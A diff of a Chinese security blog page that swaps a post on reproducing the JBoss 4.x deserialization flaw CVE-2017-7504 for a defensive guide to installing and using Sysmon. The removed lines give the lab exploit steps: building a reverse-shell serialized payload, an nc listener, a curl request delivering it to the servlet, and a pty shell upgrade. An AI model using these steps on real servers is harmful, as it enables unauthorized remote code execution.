@@ -20,24 +20,24 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="漏洞描述 JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。">
+  <meta name="description" content="描述 系统监视器（Sysmon）是Windows系统服务和设备驱动程序。应用打开或任何进程创建行为发生时，Sysmon 会使用 sha1（默认），MD5，SHA256 或 IMPHASH 记录进程镜像文件的 hash 值，包含进程创建过程中的进程 GUID，每个事件中包含 session 的 GUID。除此之外记录磁盘和卷的读取请求 &#x2F; 网络连接（包括每个连接的源进程，IP 地址，端口号，主机名和">
 <meta property="og:type" content="article">
-<meta property="og:title" content="JBoss 4.x 反序列化漏洞(CVE-2017-7504)">
-<meta property="og:url" content="http://example.com/2021/08/27/JBoss%204.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2017-7504)/index.html">
+<meta property="og:title" content="Sysmon安装与使用">
+<meta property="og:url" content="http://example.com/2021/10/29/Sysmon%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/index.html">
 <meta property="og:site_name" content="cat-nineteen">
-<meta property="og:description" content="漏洞描述 JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。">
+<meta property="og:description" content="描述 系统监视器（Sysmon）是Windows系统服务和设备驱动程序。应用打开或任何进程创建行为发生时，Sysmon 会使用 sha1（默认），MD5，SHA256 或 IMPHASH 记录进程镜像文件的 hash 值，包含进程创建过程中的进程 GUID，每个事件中包含 session 的 GUID。除此之外记录磁盘和卷的读取请求 &#x2F; 网络连接（包括每个连接的源进程，IP 地址，端口号，主机名和">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210827111919231.png">
-<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210827112227950.png">
-<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210827112436086.png">
-<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210827112510693.png">
-<meta property="article:published_time" content="2021-08-27T03:15:04.291Z">
-<meta property="article:modified_time" content="2021-08-30T03:37:35.669Z">
+<meta property="og:image" content="d:/long/BOOK/主机安全研究/sysmon使用/sysmon安装与使用.assets/image-20210820095543545.png">
+<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/A73038E4-A59D-47bf-9099-4787C7AF18B4.png">
+<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/2.png">
+<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/34.png">
+<meta property="article:published_time" content="2021-10-29T01:24:02.421Z">
+<meta property="article:modified_time" content="2021-10-29T01:17:56.806Z">
 <meta property="article:author" content="longer">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210827111919231.png">
+<meta name="twitter:image" content="d:/long/BOOK/主机安全研究/sysmon使用/sysmon安装与使用.assets/image-20210820095543545.png">
 
-<link rel="canonical" href="http://example.com/2021/08/27/JBoss%204.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2017-7504)/">
+<link rel="canonical" href="http://example.com/2021/10/29/Sysmon%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/">
 
 
 <script id="page-configurations">
@@ -50,7 +50,7 @@
   };
 </script>
 
-  <title>JBoss 4.x 反序列化漏洞(CVE-2017-7504) | cat-nineteen</title>
+  <title>Sysmon安装与使用 | cat-nineteen</title>
   
 
 
@@ -193,7 +193,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/08/27/JBoss%204.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2017-7504)/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/29/Sysmon%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -206,7 +206,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          JBoss 4.x 反序列化漏洞(CVE-2017-7504)
+          Sysmon安装与使用
         </h1>
 
         <div class="post-meta">
@@ -215,23 +215,17 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2021-08-27 11:15:04" itemprop="dateCreated datePublished" datetime="2021-08-27T11:15:04+08:00">2021-08-27</time>
+              <time title="创建时间：2021-10-29 09:24:02 / 修改时间：09:17:56" itemprop="dateCreated datePublished" datetime="2021-10-29T09:24:02+08:00">2021-10-29</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-08-30 11:37:35" itemprop="dateModified" datetime="2021-08-30T11:37:35+08:00">2021-08-30</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WEB-RCE/" itemprop="url" rel="index"><span itemprop="name">WEB-RCE</span></a>
+                  <a href="/categories/%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">主机安全</span></a>
                 </span>
             </span>
 
@@ -246,49 +240,26 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><blockquote>
-<p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p>
-</blockquote>
+        <h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><hr>
+<p>系统监视器（Sysmon）是Windows系统服务和设备驱动程序。应用打开或任何进程创建行为发生时，Sysmon 会使用 sha1（默认），MD5，SHA256 或 IMPHASH 记录进程镜像文件的 hash 值，包含进程创建过程中的进程 GUID，每个事件中包含 session 的 GUID。除此之外记录磁盘和卷的读取请求 / 网络连接（包括每个连接的源进程，IP 地址，端口号，主机名和端口名），重要的是还可在生成初期进程事件能记录在复杂的内核模式运行的恶意软件。</p>
+<hr>
 <span id="more"></span>
 
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
-<li>JBoss AS 4.x及之前版本</li>
-</ul>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>docker搭建；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub/jboss/CVE-2017-7504</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>下载sysmon;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon</span><br></pre></td></tr></table></figure>
 
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">环境</span><br><span class="line">- 靶机：centos 7/docker CVE-2017-7504</span><br><span class="line">- 攻击机：kali 2020/CVE-2015-7501</span><br></pre></td></tr></table></figure>
+<p>在sysmon目录下新启cmd并执行；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysmon64.exe -i </span><br></pre></td></tr></table></figure>
 
-<p>漏洞验证；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://XXX.XXX.XXX.XXX:8080/jbossmq-httpil/HTTPServerILServlet</span><br></pre></td></tr></table></figure>
+<p><img src="D:\long\BOOK\主机安全研究\sysmon使用\sysmon安装与使用.assets\image-20210820095543545.png" alt="image-20210820095543545"></p>
+<p>​    打开sysmon事件查看：「事件查看器」——「应用程序和服务日志」——「Microsoft」——「Windows」——「Sysmon」文件夹，其中记录了 Sysmon 写入到 Event Log 中的所有事件</p>
+<h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysmon -u</span><br></pre></td></tr></table></figure>
 
-<p>访问页面如下则可能存在有此漏洞：</p>
-<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210827111919231.png" alt="image-20210827111919231"></p>
-<p>反序列化利用工具;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ianxtianxt/CVE-2015-7501/</span><br></pre></td></tr></table></figure>
+<h2 id="过滤器标签"><a href="#过滤器标签" class="headerlink" title="过滤器标签"></a>过滤器标签</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ProcessCreate            进程创建</span><br><span class="line">FileCreateTime           文件创建时间更改</span><br><span class="line">NetworkConnect           检测到网络连接</span><br><span class="line">ProcessTerminate         进程终止</span><br><span class="line">DriverLoad               驱动程序已加载</span><br><span class="line">ImageLoad                镜像加载</span><br><span class="line">CreateRemoteThread       已检测到创建远程线程</span><br><span class="line">RawAccessRead            检测到原始访问读取</span><br><span class="line">ProcessAccess            已访问的进程</span><br><span class="line">FileCreate               文件创建</span><br><span class="line">RegistryEvent            添加或删除注册表对象</span><br><span class="line">RegistryEvent            注册表值设置</span><br><span class="line">RegistryEvent            注册表对象已重命名</span><br><span class="line">FileCreateStreamHash     已创建文件流</span><br><span class="line">PipeEvent                管道创建</span><br><span class="line">PipeEvent                管道已连接</span><br><span class="line">WmiEvent                 检测到WmiEventFilter活动 -- WmiEventFilter activity detected</span><br><span class="line">WmiEvent                 检测到WmiEventConsumer活动 -- WmiEventConsumer activity detected</span><br><span class="line">WmiEvent                 检测到WmiEventConsumerToFilter活动 -- WmiEventConsumerToFilter activity </span><br><span class="line">DnsQuery                 DNS查询</span><br></pre></td></tr></table></figure>
 
-<p>在kail攻击机中解压CVE-2015-7501，并进入目录;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unzip CVE-2015-7501-master.zip</span><br><span class="line">cd CVE-2015-7501-master/</span><br></pre></td></tr></table></figure>
-
-<p>攻击机若没有Java环境，则需先安装Java环境；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">curl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz </span><br><span class="line">tar zxvf jdk-8u20-linux-x64.tar.gz</span><br><span class="line">rm -rf /usr/bin/java*</span><br><span class="line">ln -s /opt/jdk1.8.0_20/bin/j* /usr/bin</span><br><span class="line">java -version</span><br></pre></td></tr></table></figure>
-
-<p>反序列化利用工具反弹shell;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.240.242:2333（IP是攻击机ip,2333是要监听的端口)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210827112227950.png" alt="image-20210827112227950"></p>
-<p>攻击机中另起终端，执行：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure>
-
-<p>这个时候在CVE-2015-7501-master/目录下生成了一个ReverseShellCommonsCollectionsHashMap.ser文件。</p>
-<p>使用curl就能反弹shell，执行命令:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.240.140:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser </span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210827112436086.png" alt="image-20210827112436086"></p>
-<p>若返回的shell非正常交互，则执行：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210827112510693.png" alt="image-20210827112510693"></p>
+<h2 id="事件ID"><a href="#事件ID" class="headerlink" title="事件ID"></a>事件ID</h2><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/A73038E4-A59D-47bf-9099-4787C7AF18B4.png" alt="A73038E4-A59D-47bf-9099-4787C7AF18B4"></p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/2.png" alt="2"></p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/34.png" alt="34"></p>
 
     </div>
 
@@ -323,12 +294,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/08/25/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" rel="prev" title="F5 BIG-IP 远程代码执行漏洞">
-      <i class="fa fa-chevron-left"></i> F5 BIG-IP 远程代码执行漏洞
+    <a href="/2021/10/27/%E6%88%90%E9%83%BDCCS%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E4%BC%9A/" rel="prev" title="成都CCS网络安全大会">
+      <i class="fa fa-chevron-left"></i> 成都CCS网络安全大会
     </a></div>
       <div class="post-nav-item">
-    <a href="/2021/08/27/docker%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/" rel="next" title="docker安装与使用">
-      docker安装与使用 <i class="fa fa-chevron-right"></i>
+    <a href="/2021/10/29/Arpspoof%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/" rel="next" title="Arpspoof安装与使用">
+      Arpspoof安装与使用 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -388,7 +359,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">3.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">4.</span> <span class="nav-text">漏洞复现</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E8%A3%85"><span class="nav-number">2.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%B8%E8%BD%BD"><span class="nav-number">3.</span> <span class="nav-text">卸载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E6%A0%87%E7%AD%BE"><span class="nav-number">4.</span> <span class="nav-text">过滤器标签</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8B%E4%BB%B6ID"><span class="nav-number">5.</span> <span class="nav-text">事件ID</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
